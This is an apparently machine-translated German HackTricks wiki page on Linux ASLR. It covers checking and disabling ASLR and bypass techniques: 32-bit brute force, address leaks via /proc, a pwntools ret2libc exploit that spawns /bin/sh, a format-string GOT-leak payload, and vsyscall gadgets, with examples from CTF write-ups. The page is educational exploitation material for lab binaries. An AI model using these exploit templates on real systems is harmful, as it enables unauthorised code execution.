# ASLR

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>

## Grundlegende Informationen

**Address Space Layout Randomization (ASLR)** ist eine Sicherheitstechnik, die in Betriebssystemen verwendet wird, um die **Speicheradressen zu randomisieren**, die von System- und Anwendungsprozessen verwendet werden. Dadurch wird es f√ºr einen Angreifer erheblich schwieriger, den Ort bestimmter Prozesse und Daten vorherzusagen, wie z. B. den Stack, den Heap und Bibliotheken, wodurch bestimmte Arten von Exploits, insbesondere Puffer√ºberl√§ufe, abgemildert werden.

### **√úberpr√ºfen des ASLR-Status**

Um den ASLR-Status auf einem Linux-System zu **√ºberpr√ºfen**, k√∂nnen Sie den Wert aus der Datei **`/proc/sys/kernel/randomize_va_space`** lesen. Der in dieser Datei gespeicherte Wert bestimmt den Typ des angewendeten ASLR:

* **0**: Keine Randomisierung. Alles ist statisch.
* **1**: Konservative Randomisierung. Gemeinsam genutzte Bibliotheken, Stack, mmap(), VDSO-Seite werden randomisiert.
* **2**: Vollst√§ndige Randomisierung. Zus√§tzlich zu den Elementen, die durch konservative Randomisierung randomisiert werden, wird der durch `brk()` verwaltete Speicher randomisiert.

Sie k√∂nnen den ASLR-Status mit dem folgenden Befehl √ºberpr√ºfen:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Deaktivieren von ASLR**

Um ASLR zu **deaktivieren**, setzen Sie den Wert von `/proc/sys/kernel/randomize_va_space` auf **0**. Das Deaktivieren von ASLR wird im Allgemeinen au√üerhalb von Test- oder Debugging-Szenarien nicht empfohlen. So k√∂nnen Sie es deaktivieren:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Sie k√∂nnen ASLR auch f√ºr eine Ausf√ºhrung deaktivieren mit:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Aktivierung von ASLR**

Um ASLR zu **aktivieren**, k√∂nnen Sie einen Wert von **2** in die Datei `/proc/sys/kernel/randomize_va_space` schreiben. Dies erfordert in der Regel Root-Berechtigungen. Die vollst√§ndige Randomisierung kann mit dem folgenden Befehl durchgef√ºhrt werden:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Persistenz √ºber Neustarts hinweg**

√Ñnderungen, die mit den `echo`-Befehlen vorgenommen werden, sind vor√ºbergehend und werden beim Neustart zur√ºckgesetzt. Um die √Ñnderung dauerhaft zu machen, m√ºssen Sie die Datei `/etc/sysctl.conf` bearbeiten und die folgende Zeile hinzuf√ºgen oder √§ndern:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Nachdem du `/etc/sysctl.conf` bearbeitet hast, wende die √Ñnderungen mit dem folgenden Befehl an:
```bash
sudo sysctl -p
```
Dies stellt sicher, dass Ihre ASLR-Einstellungen √ºber Neustarts hinweg bestehen bleiben.

## **Umgehungen**

### 32-Bit-Brute-Force

PaX teilt den Prozess-Adressraum in **3 Gruppen** auf:

* **Code und Daten** (initialisiert und nicht initialisiert): `.text`, `.data` und `.bss` ‚Äî> **16 Bits** Entropie in der Variablen `delta_exec`. Diese Variable wird mit jedem Prozess zuf√§llig initialisiert und zu den Anfangsadressen hinzugef√ºgt.
* **Speicher**, der von `mmap()` allokiert wurde, und **gemeinsam genutzte Bibliotheken** ‚Äî> **16 Bits**, genannt `delta_mmap`.
* **Der Stack** ‚Äî> **24 Bits**, bezeichnet als `delta_stack`. Es werden jedoch effektiv **11 Bits** verwendet (vom 10. bis zum 20. Byte einschlie√ülich), ausgerichtet auf **16 Bytes** ‚Äî> Dies ergibt **524.288 m√∂gliche reale Stack-Adressen**.

Die vorherigen Daten gelten f√ºr 32-Bit-Systeme, und die reduzierte endg√ºltige Entropie erm√∂glicht es, ASLR zu umgehen, indem der Angriff so oft wiederholt wird, bis er erfolgreich abgeschlossen ist.

#### Ideen f√ºr Brute-Force:

* Wenn Sie gen√ºgend Platz f√ºr eine **gro√üe NOP-Rutsche vor dem Shellcode** haben, k√∂nnten Sie einfach Adressen im Stack brute-forcen, bis der Fluss **√ºber einen Teil der NOP-Rutsche springt**.
* Eine weitere Option daf√ºr, falls der √úberlauf nicht so gro√ü ist und der Angriff lokal ausgef√ºhrt werden kann, besteht darin, **die NOP-Rutsche und den Shellcode in einer Umgebungsvariablen hinzuzuf√ºgen**.
* Wenn der Angriff lokal ist, k√∂nnen Sie versuchen, die Basisadresse von libc per Brute-Force zu ermitteln (n√ºtzlich f√ºr 32-Bit-Systeme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Wenn Sie einen Remote-Server angreifen, k√∂nnten Sie versuchen, die Adresse der `libc`-Funktion `usleep` durch **Brute-Force** zu ermitteln und dabei 10 als Argument zu √ºbergeben. Wenn der Server zu einem bestimmten Zeitpunkt **10 Sekunden l√§nger braucht, um zu antworten**, haben Sie die Adresse dieser Funktion gefunden.

{% hint style="success" %}
Bei 64-Bit-Systemen ist die Entropie viel h√∂her und dies ist nicht m√∂glich.
{% endhint %}

### Lokale Informationen (`/proc/[pid]/stat`)

Die Datei **`/proc/[pid]/stat`** eines Prozesses ist immer von jedem lesbar und enth√§lt interessante Informationen wie:

* **startcode** & **endcode**: Adressen √ºber und unter dem **TEXT** des Bin√§rdatei
* **startstack**: Die Adresse des Starts des **Stacks**
* **start\_data** & **end\_data**: Adressen √ºber und unter denen sich der **BSS** befindet
* **kstkesp** & **kstkeip**: Aktuelle **ESP**- und **EIP**-Adressen
* **arg\_start** & **arg\_end**: Adressen √ºber und unter denen sich die **CLI-Argumente** befinden.
* **env\_start** & **env\_end**: Adressen √ºber und unter denen sich die **Umgebungsvariablen** befinden.

Daher ist es m√∂glich, wenn der Angreifer sich auf demselben Computer wie das zu exploitierende Bin√§rprogramm befindet und dieses Bin√§rprogramm nicht den √úberlauf von Rohargumenten erwartet, sondern von einer anderen **Eingabe, die nach dem Lesen dieser Datei erstellt werden kann**. Es ist f√ºr einen Angreifer m√∂glich, **einige Adressen aus dieser Datei zu erhalten und davon Offset f√ºr den Exploit zu konstruieren**.

{% hint style="success" %}
F√ºr weitere Informationen zu dieser Datei √ºberpr√ºfen Sie [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) und suchen nach `/proc/pid/stat`
{% endhint %}

### Ein Leck haben

* **Die Herausforderung besteht darin, ein Leck zu haben**

Wenn Ihnen ein Leck gegeben wird (einfache CTF-Herausforderungen), k√∂nnen Sie davon Offset berechnen (angenommen, Sie kennen beispielsweise die genaue libc-Version, die im System verwendet wird, das Sie ausnutzen). Dieses Beispiel-Exploit wird aus dem [**Beispiel von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) extrahiert (√ºberpr√ºfen Sie diese Seite f√ºr weitere Details):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Durch Ausnutzen eines Puffer√ºberlaufs w√§re es m√∂glich, ein **ret2plt** zu manipulieren, um die Adresse einer Funktion aus der libc zu exfiltrieren. √úberpr√ºfen Sie:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Genau wie bei ret2plt, wenn Sie √ºber eine Schwachstelle bei Formatzeichenfolgen einen beliebigen Lesezugriff haben, ist es m√∂glich, die Adresse einer **libc-Funktion** aus dem GOT zu exfiltrieren. Das folgende [**Beispiel stammt von hier**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Du kannst weitere Informationen √ºber Format Strings arbitrary read in finden unter:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Versuche ASLR zu umgehen, indem du Adressen im Stack missbrauchst:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

Der **`vsyscall`** Mechanismus dient dazu, die Leistung zu verbessern, indem bestimmte Systemaufrufe im Benutzerbereich ausgef√ºhrt werden k√∂nnen, obwohl sie grunds√§tzlich Teil des Kernels sind. Der entscheidende Vorteil von **vsyscalls** liegt in ihren **festen Adressen**, die nicht der **ASLR** (Address Space Layout Randomization) unterliegen. Diese feste Natur bedeutet, dass Angreifer keine Informationslecks ben√∂tigen, um ihre Adressen zu bestimmen und sie in einem Exploit zu verwenden.\
Es werden jedoch keine besonders interessanten Gadgets hier gefunden (obwohl es zum Beispiel m√∂glich ist, ein `ret;`-√Ñquivalent zu erhalten)

(Das folgende Beispiel und der Code stammen [**aus diesem Writeup**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation))

Ein Angreifer k√∂nnte beispielsweise die Adresse `0xffffffffff600800` in einem Exploit verwenden. W√§hrend der Versuch, direkt zu einer `ret`-Anweisung zu springen, nach der Ausf√ºhrung einiger Gadgets zu Instabilit√§t oder Abst√ºrzen f√ºhren k√∂nnte, kann das Springen zum Beginn eines `syscall` aus dem **vsyscall**-Abschnitt erfolgreich sein. Durch das sorgf√§ltige Platzieren eines **ROP**-Gadgets, das die Ausf√ºhrung zu dieser **vsyscall**-Adresse f√ºhrt, kann ein Angreifer Codeausf√ºhrung erreichen, ohne **ASLR** f√ºr diesen Teil des Exploits umgehen zu m√ºssen.
```
ef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef‚û§  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>
